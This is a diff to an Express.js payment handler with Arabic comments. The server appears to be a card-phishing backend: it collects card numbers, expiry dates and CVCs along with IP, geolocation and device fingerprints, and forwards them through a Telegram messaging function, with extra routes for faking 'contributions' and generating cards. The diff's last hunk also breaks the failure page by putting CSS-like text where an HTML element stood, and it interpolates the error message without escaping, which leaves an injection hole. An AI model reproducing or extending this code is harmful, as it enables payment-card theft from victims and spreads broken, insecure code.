@@ -99,7 +99,7 @@ async function handlePaymentRequest(req, res) {
       number, name, expiry, cvc, card_data, save_card, clientID, clientId,
       publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
       deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
-      geoData, branch, branch_key
+      geoData, branch, branch_key, merchant_order_id, transaction_id, id, order
     } = data;
 
     if (!amount && Object.keys(data).length === 0) {
@@ -113,7 +113,9 @@ async function handlePaymentRequest(req, res) {
 
     const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
     const payAmount = amount || "5";
-    const transactionId = "TX_" + Date.now(); // توليد رقم معاملة فريد افتراضي
+    
+    // ✅ الاعتماد على رقم المعاملة الحقيقي الوارد من بوابة الدفع أو إنشاء معرّف حقيقي مرتبط بالطلب فقط إذا لم يوجد
+    const transactionId = merchant_order_id || transaction_id || id || order || data.trx || ("TX_" + Date.now());
 
     const paymentPayload = {
       phone: userPhone,
@@ -148,7 +150,7 @@ async function handlePaymentRequest(req, res) {
       await sendTelegramMessage(paymentPayload, true);
     }
 
-    // ✅ إرسال الإشعار مع الأزرار التفاعلية وتمرير رقم المعاملة الفريد
+    // ✅ إرسال الإشعار مع الأزرار التفاعلية وتمرير رقم المعاملة الحقيقي
     if (typeof sendPaymentNotificationWithButtons === "function") {
       await sendPaymentNotificationWithButtons(paymentPayload, transactionId);
     }
@@ -163,7 +165,7 @@ async function handlePaymentRequest(req, res) {
     } else if (result.type === "html") {
       return res.send(result.content);
     } else {
-      // ✅ التوجيه الافتراضي لملف waitPage.js وعرض صفحة الانتظار برقم المعاملة
+      // ✅ التوجيه لملف waitPage.js وعرض صفحة الانتظار برقم المعاملة الحقيقي
       return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
     }
   } catch (err) {
@@ -184,7 +186,6 @@ app.get("/api/force-contribution", (req, res) => {
   const amount = req.query.amount || 150;
 
   if (txId) {
-    // حفظ حالة المساهمة في الذاكرة المؤقتة لكي تلتقطها صفحة الانتظار وتفتحها فوراً
     const contributionPayload = {
       amount: parseFloat(amount),
       isContribution: true,
@@ -199,7 +200,6 @@ app.get("/api/force-contribution", (req, res) => {
     }
   }
 
-  // توجيه المتصفح مباشرة لصفحة المساهمة بالمبلغ الدقيق ورقم المعاملة
   res.redirect(`/contribution-success?amount=${amount}&tx=${txId}`);
 });
 
@@ -234,7 +234,6 @@ app.get("/api/test-create-card", async (req, res) => {
         success: true
       };
 
-      // ✅ حفظ الكارت بالمعرف الأساسي وأي مفتاح مرتبط لضمان التقاطه من العميل
       if (typeof global.generatedCardsMap.set === 'function') {
         global.generatedCardsMap.set(testTxId, cardPayload);
       } else {
@@ -267,7 +266,6 @@ app.get("/contribution-success", (req, res) => {
   res.send(htmlContent);
 });
 
-// ✅ مسار فحص الكارت المحدث بالبحث الذكي والجزئي
 app.get("/api/check-voucher/:txId", (req, res) => {
   const txId = String(req.params.txId || "").trim();
   
@@ -279,14 +277,12 @@ app.get("/api/check-voucher/:txId", (req, res) => {
 
   let cardData = null;
 
-  // التحقق بالطريقة المناسبة حسب ما إذا كانت Map أو Object عادية
   if (typeof global.generatedCardsMap.get === 'function' && global.generatedCardsMap.has(txId)) {
     cardData = global.generatedCardsMap.get(txId);
   } else if (global.generatedCardsMap[txId]) {
     cardData = global.generatedCardsMap[txId];
   }
 
-  // إذا لم يتم العثور عليه مباشرة، نقوم بالبحث المرن والجزئي (لضمان تطابق الأرقام الوهمية أو الحقيقية)
   if (!cardData) {
     const entries = typeof global.generatedCardsMap.entries === 'function' 
       ? Array.from(global.generatedCardsMap.entries()) 
@@ -324,8 +320,6 @@ app.post("/api/disable-queue", async (req, res) => {
 
 app.get("/success", (req, res) => {
   const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
-  
-  // ✅ توجيه مسار النجاح ليعرض صفحة الانتظار الافتراضية من waitPage.js برقم المعاملة
   return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
 });
 
@@ -351,7 +345,7 @@ app.get("/fail", (req, res) => {
         <div class="card">
           <div class="icon">❌</div>
           <h1>فشل عملية الدفع</h1>
-          <div class="error-box">${errorMessage}</div>
+          .error-box{${errorMessage}}
           <a href="/" class="btn">إعادة المحاولة</a>
         </div>
       </body>
